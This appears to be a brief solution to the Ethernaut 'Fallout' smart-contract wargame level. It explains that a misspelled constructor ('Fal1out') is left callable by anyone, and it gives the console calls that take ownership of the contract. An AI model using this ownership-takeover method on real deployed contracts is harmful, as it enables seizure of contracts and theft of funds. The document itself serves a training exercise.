/*
    Here's a blunder in the constructor, the name of the constructor doesn't matches up with the contract name, 'Look Carefully'

    Just call the function 'Fal1out' and be the owner
*/

await contract.Fal1out({value: 1})

// check for your ownership and submit
await contract.owner()